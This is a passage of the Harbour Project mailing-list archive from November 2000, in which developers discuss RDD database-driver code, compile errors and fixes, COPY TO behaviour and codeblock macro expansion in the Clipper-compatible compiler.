HB_FUNC( __DBAPP )=0A=
{=0A=
  if( ISCHAR( 1 ) )=0A=
  {=0A=
    rddMoveRecords(  hb_parc( 1 ),                /* File From */=0A=
                     NULL,                        /* TO current area */=0A=
                     hb_param( 2, HB_IT_ARRAY ),  /* Fields */=0A=
                     hb_param( 3, HB_IT_BLOCK ),  /* For */=0A=
                     hb_param( 4, HB_IT_BLOCK ),  /* While */=0A=
                     hb_parnl( 5 ),               /* Next */ /* Defaults =
to zero on bad type */=0A=
                     hb_parnl( 6 ),               /* Record */ /* =
Defaults to zero on bad type */=0A=
                     hb_parl( 7 ),                /* Rest */ /* Defaults =
to zero on bad type */=0A=
                     ISCHAR( 8 ) ? hb_parc( 8 ) : NULL ); /* RDD */=0A=
  }=0A=
}=0A=
=0A=
HB_FUNC( __DBCOPY )=0A=
{=0A=
  if( ISCHAR( 1 ) )=0A=
  {=0A=
    rddMoveRecords(  NULL,                        /* fro CURRENT Area */=0A=
                     hb_parc( 1 ),                /* To File */=0A=
                     hb_param( 2, HB_IT_ARRAY ),  /* Fields */=0A=
                     hb_param( 3, HB_IT_BLOCK ),  /* For */=0A=
                     hb_param( 4, HB_IT_BLOCK ),  /* While */=0A=
                     hb_parnl( 5 ),               /* Next */ /* Defaults =
to zero on bad type */=0A=
                     hb_parnl( 6 ),               /* Record */ /* =
Defaults to zero on bad type */=0A=
                     hb_parl( 7 ),                /* Rest */ /* Defaults =
to zero on bad type */=0A=
                     ISCHAR( 8 ) ? hb_parc( 8 ) : NULL ); /* RDD */=0A=
  }=0A=
}=0A=
=0A=
=0A=

------=_NextPart_000_0061_01C04A3A.92EE1910--


</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 08:57:02 2000
Date: Thu Nov  9 08:57:02 2000
From: Juan Agustin Barriga harbour@lists.harbour-project.org
Subject: [Harbour] RDD testing with indexes

<PRE>This is a multi-part message in MIME format.

------=_NextPart_000_006A_01C04A3B.768AAEE0
Content-Type: text/plain;
	charset=&quot;iso-8859-1&quot;
Content-Transfer-Encoding: quoted-printable

I have a test PRG which exercises thousands of file movements, seeks, =
skips, with or without deleted flag/record, etc. The program opens two =
workareas, a local one (NTX or CDX DBF) and an RDD one. The program does =
the same on both and goes on comparing flags, position, data etc. This =
certifies that the RDD is working the same as the default one. Until =
Harbour... I try to run it, and it crashes both with CDX or NTX. =
dbClearInd(), dbSetIndex(), or elsewhere. Does this mean that they are =
not yet fully functional? Whith what can I compare the results of my =
RDD?

Regards
Harrier

------=_NextPart_000_006A_01C04A3B.768AAEE0
Content-Type: text/html;
	charset=&quot;iso-8859-1&quot;
Content-Transfer-Encoding: quoted-printable

&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.0 Transitional//EN&quot;&gt;
&lt;HTML&gt;&lt;HEAD&gt;
&lt;META content=3D&quot;text/html; charset=3Diso-8859-1&quot; =
http-equiv=3DContent-Type&gt;
&lt;META content=3D&quot;MSHTML 5.00.3207.2500&quot; name=3DGENERATOR&gt;
&lt;STYLE&gt;&lt;/STYLE&gt;
&lt;/HEAD&gt;
&lt;BODY bgColor=3D#ffffff&gt;
&lt;DIV&gt;&lt;FONT face=3DArial size=3D2&gt;I have a test PRG which exercises =
thousands of file=20
movements, seeks, skips, with or without deleted flag/record, etc. The =
program=20
opens two workareas, a local one (NTX or CDX DBF) and an RDD one. The =
program=20
does the same on both and goes on comparing flags, position, data etc. =
This=20
certifies that the RDD is working the same as the default one. Until =
Harbour...=20
I try to run it, and it crashes both with CDX or NTX. dbClearInd(),=20
dbSetIndex(), or elsewhere. Does this mean that they are not yet fully=20
functional? Whith what can I compare the results of my RDD?&lt;/FONT&gt;&lt;/DIV&gt;
&lt;DIV&gt;&amp;nbsp;&lt;/DIV&gt;
&lt;DIV&gt;&lt;FONT face=3DArial size=3D2&gt;Regards&lt;/FONT&gt;&lt;/DIV&gt;
&lt;DIV&gt;&lt;FONT face=3DArial size=3D2&gt;Harrier&lt;/FONT&gt;&lt;/DIV&gt;&lt;/BODY&gt;&lt;/HTML&gt;

------=_NextPart_000_006A_01C04A3B.768AAEE0--


</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 09:45:03 2000
Date: Thu Nov  9 09:45:03 2000
From: Victor Szakats harbour@lists.harbour-project.org
Subject: [Harbour] header files

<PRE>Brian,

&gt;<i> &quot;Should hbapirdd.h #include ord.ch ?&quot;
</I>&gt;<i>
</I>&gt;<i> I don't know.  An RDD person please tell Brian. :-)
</I>
It should include it, yes, along with a note in ORD.CH that reads:
/* NOTE: This file is also used by C code. */

Victor Szakats



</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 11:25:04 2000
Date: Thu Nov  9 11:25:04 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] fix and fix needed

<PRE>[To All]

source\pp\ppcore.c(3159) : error C2446: '=3D=3D' : no conversion from 'in=
t' to 'char*'
source\pp\ppcore.c(3159) : error C2446: '=3D=3D' : no conversion from 'in=
t' to 'char*'

The fix is:
  while( *pTmp =3D=3D ' ' || *pTmp =3D=3D '\t' )

source\rdd\dbcmd.c(2755) : error C2664: 'unsigned short(__cdecl *)(struct=
 _AREA*,DBOPENINFO*)' : cannot convert parameter 1 from 'DBORDSCOPEINFO*'=
 to 'DBOPENINFO*'

The fix is unknown to me. :-(  The error says it's param 1 but it looks
like param 2 to me.  But what cast does it need?

John.

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 12:02:02 2000
Date: Thu Nov  9 12:02:02 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] fix and fix needed

<PRE>2000-11-09 09:00 UTC+0800 Ron Pinkas &lt;<A HREF="mailto:ron@profit-master.com">ron@profit-master.com</A>&gt;
   * source/pp/ppcore.c
     * Fixed typo in NextName()

&gt;<i> [To All]
</I>&gt;<i> 
</I>&gt;<i> source\pp\ppcore.c(3159) : error C2446: '==' : no conversion from 
</I>&gt;<i> 'int' to 'char*'
</I>&gt;<i> source\pp\ppcore.c(3159) : error C2446: '==' : no conversion from 
</I>&gt;<i> 'int' to 'char*'
</I>&gt;<i> 
</I>&gt;<i> The fix is:
</I>&gt;<i>   while( *pTmp == ' ' || *pTmp == '\t' )
</I>&gt;<i> 
</I>&gt;<i> source\rdd\dbcmd.c(2755) : error C2664: 'unsigned short(__cdecl 
</I>&gt;<i> *)(struct _AREA*,DBOPENINFO*)' : cannot convert parameter 1 from 
</I>&gt;<i> 'DBORDSCOPEINFO*' to 'DBOPENINFO*'
</I>&gt;<i> 
</I>&gt;<i> The fix is unknown to me. :-(  The error says it's param 1 but it looks
</I>&gt;<i> like param 2 to me.  But what cast does it need?
</I>&gt;<i> 
</I>&gt;<i> John.
</I>

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 12:19:01 2000
Date: Thu Nov  9 12:19:01 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] CHANGELOG: 2000-11-08 11:28 UTC+0800

<PRE>John:
Yes, but I don't understand what they mean with &quot;the physical position
within the order&quot;,
Is it the same as the true recno, and should the docs say &quot;the physical
position in the data store&quot; ??

Brian Hays
Abacus Data Systems, Inc

----- Original Message -----
From: &quot;John Skelton&quot; &lt;<A HREF="mailto:John_Skelton@compuserve.com">John_Skelton@compuserve.com</A>&gt;
To: &lt;<A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>&gt;
Sent: Thursday, November 09, 2000 3:09 am
Subject: [Harbour] CHANGELOG: 2000-11-08 11:28 UTC+0800


Brian,

Those RDD changes look really exciting!

&quot;DBOI_POSITION  &lt;&lt; changed DBOI_RECNO to this!&quot;

That confused me.  You mean the 1st to be the logical (index/etc)
position &amp; the 2nd the physical position, same as 5.3?

John.
_______________________________________________
Harbour mailing list
<A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
<A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>

Thank you for participating in The Harbour Project.  Be sure to check
<A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>



</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 12:25:04 2000
Date: Thu Nov  9 12:25:04 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] Strange findings

<PRE>Yes, I'm aware of the issues, though not intimate with them on a day-to-day
basis (that's why I always worked in Clipper!)
The OBJs were compiled exactly the same and had the exactsame TLIB command
to move them into the libraries.
Remember--EACH routine could be the slower or the faster depending on where
it was in the link script!

Wait a minute!!:: I just realized the OBJs had the same name in their
respective libs, but the function names were different.
Could the OBJ module name be an issue, creating some kind of
re-direction/mangling?  I did just find out that, unlike my beloved Blinker,
TLink will pull an entire OBJ in if a func is referenced, instead of working
on the function level of granularity.


Brian Hays
Abacus Data Systems, Inc

----- Original Message -----
From: &quot;John Skelton&quot; &lt;<A HREF="mailto:John_Skelton@compuserve.com">John_Skelton@compuserve.com</A>&gt;
To: &lt;<A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>&gt;
Sent: Thursday, November 09, 2000 3:09 am
Subject: [Harbour] Strange findings


Brian,

One possibility, though it doesn't strike me as at all certain!, is
to do with alignment.  Probably code alignment, rather than data, in
view of your results.

Some C compilers try to align Intel 32-bit functions on 32-bit (dword)
boundaries.  Other compilers don't do that.  Sometimes there's a
command line option.  A lot of Intel (&amp; AMD etc) CPUs can run faster
if code is aligned that way.

So, maybe your code isn't being aligned like that, depending how you
link.

Similar issues apply to data alignment, especially with block moves
and copies.

Er... did you want to know this stuff? :-)  Sorry if you already did!

BTW, if this is the reason, it's probably worth fixing at some later
date.

John.
_______________________________________________
Harbour mailing list
<A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
<A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>

Thank you for participating in The Harbour Project.  Be sure to check
<A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>



</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 12:27:01 2000
Date: Thu Nov  9 12:27:01 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] COPY TO

<PRE>The COPY TO should _ALWAYS_ create the target; it is not documented to
append to an existing file, nor should it unless you want to add some kind
of flag for extended behavior.

Brian Hays
Abacus Data Systems, Inc

----- Original Message -----
From: &quot;Juan Agustin Barriga&quot; &lt;<A HREF="mailto:harrier@topconnect.cl">harrier@topconnect.cl</A>&gt;
To: &lt;<A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>&gt;
Sent: Thursday, November 09, 2000 6:13 am
Subject: Re: [Harbour] COPY TO


&gt;<i> Brian,
</I>&gt;<i>           I have NOT implemented the creation of the TO file if it does
</I>not
&gt;<i> exist. And here I have a BIG question, how do you know if the file does or
</I>&gt;<i> not exist BEFORE attempting to open it? TOPConnect has a TCCANOPEN( cFile,
</I>&gt;<i> [cIndex]) to test this, but this is not an RDD method. I understand there
</I>is
&gt;<i> a FILE function in Cl*pper, but don't know where it is mapped, and suspect
</I>&gt;<i> it will only work with DBF files. So, wouldn't it be nice to ADD a new
</I>&gt;<i> method to the vtable that manages this?
</I>&gt;<i>
</I>&gt;<i> Regards
</I>&gt;<i> Harrier
</I>&gt;<i>
</I>&gt;<i> ----- Original Message -----
</I>&gt;<i> From: &quot;Brian Hays&quot; &lt;<A HREF="mailto:bhays@abacuslaw.com">bhays@abacuslaw.com</A>&gt;
</I>&gt;<i> To: &lt;<A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>&gt;
</I>&gt;<i> Sent: Wednesday, November 08, 2000 6:59 PM
</I>&gt;<i> Subject: [Harbour] COPY TO
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> &gt; Harrier:
</I>&gt;<i> &gt; I tried the new rddcpy.c that you sent to the list, and it still has an
</I>&gt;<i> &gt; error here whether or not I use ADS:
</I>&gt;<i> &gt; Open Error on the target file.
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; Brian Hays
</I>&gt;<i> &gt;
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; _______________________________________________
</I>&gt;<i> &gt; Harbour mailing list
</I>&gt;<i> &gt; <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> &gt; <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> &gt; <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i> &gt;
</I>&gt;<i>
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i>
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i>
</I>

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 12:31:01 2000
Date: Thu Nov  9 12:31:01 2000
From: rglab harbour@lists.harbour-project.org
Subject: [Harbour] Strange findings

<PRE>Brian Hays wrote:
 
&gt;<i> Remember--EACH routine could be the slower or the faster depending on where
</I>&gt;<i> it was in the link script!
</I>
  Maybe it is a feature of incremantal linking...

Regards, Ryszard

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 12:34:01 2000
Date: Thu Nov  9 12:34:01 2000
From: David G. Holm harbour@lists.harbour-project.org
Subject: [Harbour] strtoken behavior

<PRE>** Reply to message from &quot;Brian Hays&quot; &lt;<A HREF="mailto:bhays@abacuslaw.com">bhays@abacuslaw.com</A>&gt; on Wed, 8
Nov 2000 15:51:46 -0800

&gt;<i> It has an explicit section that skips over a leading delimiter.  To me, this
</I>&gt;<i> seems wrong
</I>
That sure seems wrong to me too.
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 12:35:03 2000
Date: Thu Nov  9 12:35:03 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] fix and fix needed

<PRE>John:


&gt;<i>source\rdd\dbcmd.c(2755) : error C2664: 'unsigned short(__cdecl *)(struct
</I>_AREA*,DBOPENINFO*)' : cannot convert
&gt;<i>parameter 1 from 'DBORDSCOPEINFO*' to 'DBOPENINFO*'
</I>
I may have misunderstood a casting here and broken it. Although it works
here with Borland.  You do have the latest CVS since yesterday morning,
right?  (Did I fix it or break it?)  Unfortunately I have to leave for the
office right now; if necessary, try to compare dbcmd.c to an earlier version
on that line and restore it; I won't be able to work on it until tonight.

Brian Hays
Abacus Data Systems, Inc

----- Original Message -----
From: &quot;John Skelton&quot; &lt;<A HREF="mailto:John_Skelton@compuserve.com">John_Skelton@compuserve.com</A>&gt;
To: &lt;<A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>&gt;
Sent: Thursday, November 09, 2000 8:22 am
Subject: [Harbour] fix and fix needed


[To All]

source\pp\ppcore.c(3159) : error C2446: '==' : no conversion from 'int' to
'char*'
source\pp\ppcore.c(3159) : error C2446: '==' : no conversion from 'int' to
'char*'

The fix is:
  while( *pTmp == ' ' || *pTmp == '\t' )

The fix is unknown to me. :-(  The error says it's param 1 but it looks
like param 2 to me.  But what cast does it need?

John.
_______________________________________________
Harbour mailing list
<A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
<A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>

Thank you for participating in The Harbour Project.  Be sure to check
<A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>



</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 12:39:02 2000
Date: Thu Nov  9 12:39:02 2000
From: rglab harbour@lists.harbour-project.org
Subject: [Harbour] dbOrderInfo and dbcmd.c

<PRE>Victor Szakats wrote:

&gt;<i> Why not write a C lever worker function which would be called by the
</I>&gt;<i> 3 flavours of the Harbour level functions ? This way their speed would be
</I>&gt;<i> identical, and there would be no problem disabling the 5.3 one.
</I>[...]
&gt;<i> And my proposed method would look like this:
</I>&gt;<i> 
</I>&gt;<i> _FUNLOW() does the work
</I>&gt;<i> FUN1() calls _FUNLOW()
</I>&gt;<i> FUN2() calls _FUNLOW()
</I>&gt;<i> FUN3() calls _FUNLOW()
</I>
  Yes, I also prefer this method. This has an advatage that it will
allow for easy addition of other high level wrapper functions in the
future.

Regards, Ryszard

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 13:01:01 2000
Date: Thu Nov  9 13:01:01 2000
From: rglab harbour@lists.harbour-project.org
Subject: [Harbour] _GET_, _1 and optimisers

<PRE>John Skelton wrote:

&gt;<i> Clipper's has a bug which I think is not well known:
</I>&gt;<i> do case
</I>&gt;<i> case nMsg == 1
</I>&gt;<i> case nMsg == 2
</I>&gt;<i> ...
</I>&gt;<i> case nMsg == N  // where N is another integer (whole number) constant
</I>&gt;<i> endcase
</I>
  At this moment we don't optimize any statements - only expressions are
optimized. I think this is a bug that shouldn't be repeated in harbour.

Regards, Ryszard

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 13:15:03 2000
Date: Thu Nov  9 13:15:03 2000
From: rglab harbour@lists.harbour-project.org
Subject: [Harbour] Early and Late macro expansions in a codeblock

<PRE>  As pointed by Ron we didn't support this Clipper feature . Currently
only Simplex version is compatible with Clipper here. However this is
just a copy of Clipper behavior. This limits the usage to very simple
expressions. For example Clipper compiles:

LOCAL macro
{|| &amp;macro}
however doesn't compile
{|| &amp;macro+1}
or 
{|var| &amp;macro+var}

  I think that this limitation is unnecessary and shouldn't be
reproduced in harbour. We can implement the full support for early
expansion (at codeblock creation time) using detached local variables
that will be initialized with a value of macro variable directly after a
codeblock creation. This way we will be able to create a codeblock with
no macro compilation of &quot;{|| ....}&quot; expression that will give access to
any local/memvar variable. For initialization purpose we will need an
additional opcode so the codeblock pcodes will look something like:

PushBlock &lt;size&gt;
...
EndBlock
Push &lt;macroVar1&gt;
Push &lt;macroVar2&gt;
HB_P_INITBLOCK &lt;number of variable to initialize&gt;

Any opinions here?

Regards, Ryszard

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 14:01:01 2000
Date: Thu Nov  9 14:01:01 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] 2000-11-09 11:00 UTC+0800 Ron Pinkas <ron@profit-master.com>

<PRE>2000-11-09 11:00 UTC+0800 Ron Pinkas &lt;<A HREF="mailto:ron@profit-master.com">ron@profit-master.com</A>&gt;
   * source/pp/ppcore.c
     * Added parameter BOOL bRule to md_strAt() to differentiate between
searching a Rule Text or an Expression.
       /* [...] should be searched within Rule, but _not_ within an
Expression. */


</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 14:20:03 2000
Date: Thu Nov  9 14:20:03 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] Early and Late macro expansions in a codeblock

<PRE>&gt;<i>   As pointed by Ron we didn't support this Clipper feature . Currently
</I>&gt;<i> only Simplex version is compatible with Clipper here. However this is
</I>&gt;<i> just a copy of Clipper behavior. This limits the usage to very simple
</I>&gt;<i> expressions. For example Clipper compiles:
</I>&gt;<i>
</I>&gt;<i> LOCAL macro
</I>&gt;<i> {|| &amp;macro}
</I>&gt;<i> however doesn't compile
</I>&gt;<i> {|| &amp;macro+1}
</I>&gt;<i> or
</I>&gt;<i> {|var| &amp;macro+var}
</I>
Just changing LOCAL above to PRIVATE or PUBLIC resolves the above, as is
also clearly suggested by Clipper's Error Messages:

Error C2050  Code block contains both macro and declared symbol references

and

Error C2081  Macro of declared symbol: '{|var| &amp;macro + Var }'

&gt;<i>   I think that this limitation is unnecessary and shouldn't be
</I>&gt;<i> reproduced in harbour. We can implement the full support for early
</I>&gt;<i> expansion (at codeblock creation time) using detached local variables
</I>&gt;<i> that will be initialized with a value of macro variable directly after a
</I>&gt;<i> codeblock creation. This way we will be able to create a codeblock with
</I>&gt;<i> no macro compilation of &quot;{|| ....}&quot; expression that will give access to
</I>&gt;<i> any local/memvar variable. For initialization purpose we will need an
</I>&gt;<i> additional opcode so the codeblock pcodes will look something like:
</I>&gt;<i>
</I>&gt;<i> PushBlock &lt;size&gt;
</I>&gt;<i> ...
</I>&gt;<i> EndBlock
</I>&gt;<i> Push &lt;macroVar1&gt;
</I>&gt;<i> Push &lt;macroVar2&gt;
</I>&gt;<i> HB_P_INITBLOCK &lt;number of variable to initialize&gt;
</I>&gt;<i>
</I>&gt;<i> Any opinions here?
</I>
I, for one, don't think this is worth such effort and change.

Ron


</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 14:55:04 2000
Date: Thu Nov  9 14:55:04 2000
From: Juan Agustin Barriga harbour@lists.harbour-project.org
Subject: [Harbour] COPY TO

<PRE>I completely agree, but we need a &quot;standard&quot; way to verify file existence,
else the SELF_OPEN sends an error.

Regards
Harrier

----- Original Message -----
From: &quot;Brian Hays&quot; &lt;<A HREF="mailto:bhays@abacuslaw.com">bhays@abacuslaw.com</A>&gt;
To: &lt;<A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>&gt;
Sent: Thursday, November 09, 2000 1:26 PM
Subject: Re: [Harbour] COPY TO


&gt;<i> The COPY TO should _ALWAYS_ create the target; it is not documented to
</I>&gt;<i> append to an existing file, nor should it unless you want to add some kind
</I>&gt;<i> of flag for extended behavior.
</I>&gt;<i>
</I>&gt;<i> Brian Hays
</I>&gt;<i> Abacus Data Systems, Inc
</I>&gt;<i>
</I>&gt;<i> ----- Original Message -----
</I>&gt;<i> From: &quot;Juan Agustin Barriga&quot; &lt;<A HREF="mailto:harrier@topconnect.cl">harrier@topconnect.cl</A>&gt;
</I>&gt;<i> To: &lt;<A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>&gt;
</I>&gt;<i> Sent: Thursday, November 09, 2000 6:13 am
</I>&gt;<i> Subject: Re: [Harbour] COPY TO
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> &gt; Brian,
</I>&gt;<i> &gt;           I have NOT implemented the creation of the TO file if it does
</I>&gt;<i> not
</I>&gt;<i> &gt; exist. And here I have a BIG question, how do you know if the file does
</I>or
&gt;<i> &gt; not exist BEFORE attempting to open it? TOPConnect has a
</I>CCANOPEN( cFile,
&gt;<i> &gt; [cIndex]) to test this, but this is not an RDD method. I understand
</I>there
&gt;<i> is
</I>&gt;<i> &gt; a FILE function in Cl*pper, but don't know where it is mapped, and
</I>suspect
&gt;<i> &gt; it will only work with DBF files. So, wouldn't it be nice to ADD a new
</I>&gt;<i> &gt; method to the vtable that manages this?
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; Regards
</I>&gt;<i> &gt; Harrier
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; ----- Original Message -----
</I>&gt;<i> &gt; From: &quot;Brian Hays&quot; &lt;<A HREF="mailto:bhays@abacuslaw.com">bhays@abacuslaw.com</A>&gt;
</I>&gt;<i> &gt; To: &lt;<A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>&gt;
</I>&gt;<i> &gt; Sent: Wednesday, November 08, 2000 6:59 PM
</I>&gt;<i> &gt; Subject: [Harbour] COPY TO
</I>&gt;<i> &gt;
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; &gt; Harrier:
</I>&gt;<i> &gt; &gt; I tried the new rddcpy.c that you sent to the list, and it still has
</I>an
&gt;<i> &gt; &gt; error here whether or not I use ADS:
</I>&gt;<i> &gt; &gt; Open Error on the target file.
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; Brian Hays
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; _______________________________________________
</I>&gt;<i> &gt; &gt; Harbour mailing list
</I>&gt;<i> &gt; &gt; <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> &gt; &gt; <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> &gt; &gt; <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; _______________________________________________
</I>&gt;<i> &gt; Harbour mailing list
</I>&gt;<i> &gt; <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> &gt; <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> &gt; <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i> &gt;
</I>&gt;<i>
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i>
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i>
</I>

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 15:31:04 2000
Date: Thu Nov  9 15:31:04 2000
From: David G. Holm harbour@lists.harbour-project.org
Subject: [Harbour] COPY TO

<PRE>** Reply to message from &quot;Juan Agustin Barriga&quot; &lt;<A HREF="mailto:harrier@topconnect.cl">harrier@topconnect.cl</A>&gt;
on Thu, 9 Nov 2000 16:53:23 -0400

&gt;<i> I completely agree, but we need a &quot;standard&quot; way to verify file existence,
</I>
There *is* a standard way to verify the existence of a file: If you are
writing Harbour code, use the FILE( &lt;xcFilename&gt; ) function. If you are
writing C code, use the hb_fsFile( BYTE * pFilename ) function.
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 15:58:02 2000
Date: Thu Nov  9 15:58:02 2000
From: Juan Agustin Barriga harbour@lists.harbour-project.org
Subject: [Harbour] COPY TO

<PRE>David,
        FILE or fsFile are DBF file functions. They are not mapped to any
known (by me) RDD function, so they don't work with my RDD, where files are
DataBase tables in some remote system... The COPY TO should be able to check
file existance with ANY RDD, currently this is not posible (as it is not now
in Cl*ipper, where TOPConnect programmers know they have to create the TO
file). Any suggestions as how this can be implemented, I vote for a
FILEEXIST new RDD method so you could say:
if ( !SELF_FILEEXISTS( &quot;myfile&quot;) )
    create_it()
It should take an optional second parameter to check Index existence
if ( !SELF_FILEEXISTS( &quot;myfile&quot;, &quot;theindex&quot;) )
    create_theindex()
Sorry,  I'm writting in C..., but I write RDD's. Can this be mapped to the
Harbour level? FILE can only check &quot;physical&quot; files (for what I know it
knows nothing about file/index distinction) . Maybe a new function?

I need something so COPY TO will work with any underlying file system. Or
not?

Regards
Harrier

----- Original Message -----
From: &quot;David G. Holm&quot; &lt;<A HREF="mailto:dholm@jsd-llc.com">dholm@jsd-llc.com</A>&gt;
To: &lt;<A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>&gt;
Sent: Thursday, November 09, 2000 4:24 PM
Subject: Re: [Harbour] COPY TO


&gt;<i> ** Reply to message from &quot;Juan Agustin Barriga&quot; &lt;<A HREF="mailto:harrier@topconnect.cl">harrier@topconnect.cl</A>&gt;
</I>&gt;<i> on Thu, 9 Nov 2000 16:53:23 -0400
</I>&gt;<i>
</I>&gt;<i> &gt; I completely agree, but we need a &quot;standard&quot; way to verify file
</I>existence,
&gt;<i>
</I>&gt;<i> There *is* a standard way to verify the existence of a file: If you are
</I>&gt;<i> writing Harbour code, use the FILE( &lt;xcFilename&gt; ) function. If you are
</I>&gt;<i> writing C code, use the hb_fsFile( BYTE * pFilename ) function.
</I>&gt;<i> --
</I>&gt;<i> David G. Holm, Set Captain and all around
</I>&gt;<i> Harbour Project Clipper Compatibility fanatic.
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i>
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i>
</I>

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 16:11:01 2000
Date: Thu Nov  9 16:11:01 2000
From: David G. Holm harbour@lists.harbour-project.org
Subject: [Harbour] COPY TO

<PRE>** Reply to message from &quot;Juan Agustin Barriga&quot; &lt;<A HREF="mailto:harrier@topconnect.cl">harrier@topconnect.cl</A>&gt;
